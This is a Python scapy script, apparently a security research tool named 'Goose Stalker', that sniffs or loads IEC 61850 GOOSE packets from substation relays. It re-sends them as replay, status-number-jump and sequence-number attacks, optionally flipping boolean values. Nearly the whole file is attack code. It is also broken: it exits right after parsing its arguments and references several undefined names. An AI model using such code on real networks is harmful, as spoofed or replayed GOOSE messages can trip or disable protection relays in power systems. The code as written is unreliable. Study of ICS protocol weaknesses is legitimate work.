from scapy.all import *
import goose
import sys, signal
import time, datetime
import argparse

GOOSE_TYPE     = 0x88b8
replayPauseSec = 60
stNumAttackInc = 100
sqSendCnt      = 5
filetime       = datetime.datetime.fromtimestamp(int(time.time())).strftime('%Y%m%d%H%M%S')
#ONF_MOD  = '/tmp/goose_mod_' + filetime + '.pcap'
# Device names to concentrate interactions
#deviceNames = ['C60_Device1','C60-Device2','D60-Device3','SEL-Device4']

#########################
# Parse Arguments
#########################
p_args = argparse.ArgumentParser(description='CutSec: Goose Stalker')
p_args.add_argument('-D', '--debug',action='count',default=0,dest='DEBUG',help='Turn on debugging level: -D normal, -DD verbose')
p_args.add_argument('-f', '--infile',dest='infPcap')
p_args.add_argument('-o', '--outfile',default='/tmp/goose_mod_' + filetime + '.pcap',dest='onfPcap') 
p_args.add_argument('-L', '--device-list',nargs='*',default=[],dest='deviceNames',help='List of device names to limit interactions: C60_Device1 C60-Device2 D60-Device3 SEL-Device4')
p_args.add_argument('-iI','--cap',default='eth0',dest='capInterface')
p_args.add_argument('-oI','--send',default='eth0',dest='sndInterface')
p_args.add_argument('-t', '--update-time',action='store_false',dest='setTime')
p_args.add_argument('-d', '--delay',default=60,dest='resendTimeDelay')
p_args.add_argument('-F', '--flip-booleans',action='store_true',dest='flipBooleans')
# Attacks
p_args.add_argument('-a','--attack',choices=['replay','status','sequence'],default='replay',dest='attackType')

args = p_args.parse_args()

def signal_handler(sig,frame):
    print('Manual interrupt captured: cntl-c')
    sys.exit()

def timeStrFrom64bits(t):
    # Microsecond Resolution Ignored
    if args.DEBUG: print('In timeToString')
    time32Int = int.from_bytes(t[:4],'big')
    time32Str = datetime.fromtimestamp(time32Int).strftime('%Y-%m-%d %H:%M:%S')
    return time32Str

def curTime64Bits(utc=False):
    # Microsecond Resolution Ignored
    if args.DEBUG: print('In curTimeBytes')
    if utc:
        curTime = time.mktime(datetime.utcnow().timetuple())
    else:
        curTime = time.mktime(datetime.now().timetuple())
    curTimeInt = int(curTime)
    curTimeInt64 = (curTimeInt << 32)
    curTimeInt64Str = curTimeInt64.to_bytes(8,'big')
    return curTimeInt64Str


def scapyWrite(pkt):
    if args.DEBUG: print('In scapyWrite')
    # Update time, unless told not to
    if args.setTime:
        #t = pkt.getfieldval('t').load
        pkt.setfieldval('t', curTimeBytes())
    wrpcap(args.onfPcap, pkt, append=True)  #appends packet to output file

def sendPacket(pkt):
    if args.DEBUG: print('In sendPacket')
    # Update time, unless told not to
    if args.setTime:
        #t = pkt.getfieldval('t').load
        pkt.setfieldval('t',curTimeBytes())
    sendp(pkt,iface=args.sndInterface)

    
def modPacket(pkt):
    if args.DEBUG: print('In modPacket: %r\n\n'%(pkt))
    pktData = pkt.allData.load
    if args.DEBUG > 1: print('modPacket - pktData: %r\n\n'%(pktData))
    cnt = 0
    newData = b''
    while cnt < len(pktData):
        newSub = b''
        if pktData[cnt] == ord(b'\x83'):
            newSub = pktData[cnt:cnt+pktData[cnt+1]+2]
            if newSub == b'\x83\x01\x00':
                newSub = b'\x83\x01\x01'
            else:
                newSub = b'\x83\x01\x00'
        else:
            newSub = pktData[cnt:cnt+pktData[cnt+1]+2]
        newData += newSub
        cnt = cnt + pktData[cnt+1] + 2
    return newData

def gooseTest(pkt):
    if args.DEBUG: print('In gooseTest')
    isGoose = False
    # Test for a Goose Ether Type
    if pkt.haslayer('Dot1Q'):
        if pkt[Dot1Q].type == GOOSE_TYPE: isGoose = True
    if pkt.haslayer('Ether'):
        if pkt[Ether].type == GOOSE_TYPE: isGoose = True
    return isGoose

def deviceTest(pkt):
    if args.DEBUG: print('In deviceTest')
    isDevice = False
    # Test for specified devices and return if not in list
    goID = p.getfieldval('goID').load.decode()
    if goID in args.deviceName:
        isDevice = True
    return isDevice

########################
# status_num_attack: Jump the Status Number to see if devices handle the jump or if things cannot communicate
########################
def status_num_attack(pkts):
    if args.DEBUG: print('In status_num_attack')
    # Store new packets to send after a pause
    newPackets = []
    for p in packets:
        if gooseTest(p):
            try:
                if args.flipBooleans:
                    modData = modPacket(p)
                    p.setfieldval('allData',modData)
                    if args.DEBUG > 1: print('modData modded p: %r\n\n'%(p))
                # Set Status Number
                stNumLen = p.getfieldval('stNumLen')
                stNum = p.getfieldval('stNum').load
                if args.DEBUG > 1: print('stNum get: %r'%(stNum))
                # Increment the Status Number by stNumAttackInc 
                stNum = (int.from_bytes(stNum,'big') + stNumAttackInc).to_bytes(stNumLen,'big')
                if args.DEBUG > 1: print('stNum set: %r'%(stNum))
                p.setfieldval('stNum',stNum)

                # Set Sequence number starting at 0
                ## TODO: Should keep track of devices and stNum. Only build series of 
                ##       packets for one Status Number per device (not every packet)
                for e in range(sqSendCnt):
                    sqNumLen = 1
                    sqNum = (int.from_bytes(sqNum,'big') + 1).to_bytes(sqNumLen,'big')
                    p.setfieldval('sqNumLen', sqNumLen)
                    p.setfieldval('sqNum', sqNum)
                    if args.DEBUG: print('sqNumLen - sqNum set: %d - %r'%(sqNumLen,sqNum))
                
                    # Handle packet
                    if args.sndInterface:
                        sendPacket(p)
                    elif args.onfPcap:
                        scapyWrite(p)
                    else:
                        p.show()

            except Exception as e:
                print('status_num_attack: Failed to parse: %s: %r'%(e,p))
                return 1
                #pass

########################
# replay_attack: Pause long enough to address relay issue and then and replay messages
########################
def replay_attack(pkts):
    if args.DEBUG: print('In replay_attack')
    # Store new packets to send after a pause
    time.sleep(replayPauseSec)
    newPackets = []
    for p in packets:
        if gooseTest(p):
            try:
                if args.flipBooleans:
                    modData = modPacket(p)
                    p.setfieldval('allData',modData)
                    if args.DEBUG > 1: print('modData modded p: %r\n\n'%(p))
                
                # Handle packet
                if args.sndInterface:
                    sendPacket(p)
                elif args.onfPcap:
                    scapyWrite(p)
                else:
                    p.show()

            except Exception as e:
                print('replay_attack: Failed to parse: %s: %r'%(e,p))
                return 1
                #pass

########################
# sqNum_attack: Pause long enough to address relay issue and then and replay messages but update Sequence Numbers
########################
def sqNum_attack(pkts):
    if args.DEBUG: print('In sqNum_attack')
    # Store new packets to send after a pause
    time.sleep(replayPauseSec)
    newPackets = []
    for p in packets:
        if gooseTest(p):
            try:
                if flipBooleans:
                    modData = modPacket(p)
                    p.setfieldval('allData',modData)
                    if args.DEBUG > 1: print('modData modded p: %r\n\n'%(p))

                if args.DEBUG: print('sqNum get: %r'%(p.getfieldval('sqNum').load))
                sqNum = p.getfieldval('sqNum').load
                if args.DEBUG > 1: print('sqNumLen: %r'%(p.getfieldval('sqNumLen')))

                # NOTE: Should build after last packet sqNum
                # Sending several packets for every one will eventually send more than originally.
                # Some will be original packet sqNums but these should be ignored
                for e in range(sqSendCnt):
                    sqNumLen = p.getfieldval('sqNumLen')
                    sqNum = (int.from_bytes(sqNum,'big') + 1).to_bytes(sqNumLen,'big')
                    p.setfieldval('sqNum', sqNum)
                    if args.DEBUG: print('sqNum set: %r'%(sqNum))
                    scapyWrite(p)
                
                # Handle packet
                if args.sndInterface:
                    sendPacket(p)
                elif args.onfPcap:
                    scapyWrite(p)
                else:
                    p.show()

            except Exception as e:
                print('replay_attack: Failed to parse: %s: %r'%(e,p))
                return 1
                #pass

if __name__ == "__main__":
    # Allow user to exit program
    signal.signal(signal.SIGINT,signal_handler)

    print('Args: %s'%(args))
    sys.exit()

    # Read packets from packet capture
    if args.infPcap:
        packets = rdpcap(args.infPcap)
    # Capture packets
    elif capInterface:
        #packets = sniff(iface=capInterface,count=1000,prn=gooseCheck,filter='ether proto 0x88b8',store=False)
        packets = sniff(iface=args.capInterface,count=1000,filter='ether proto 0x88b8',store=False)
    else:
        print('gooseStalker: must select and interface or PCAP file to parse.')
        p_args.print_help()

    if args.attackType == 'replay':
        replay_attack(packets)
    if args.attackType == 'status':
        status_num_attack(packets)
    if args.attackType == 'sequence':
        sqNum_attack(packets)
